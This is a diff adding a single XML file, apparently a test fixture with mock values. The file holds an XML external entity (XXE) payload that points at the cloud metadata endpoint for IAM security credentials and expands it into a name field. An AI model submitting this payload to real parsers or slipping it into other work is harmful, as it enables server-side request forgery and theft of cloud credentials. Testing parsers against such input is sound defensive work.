@@ -1,0 +1,1 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [<!ENTITY a SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/mock-user">]><root><name>tst &a;</name><password>tett</password></root>
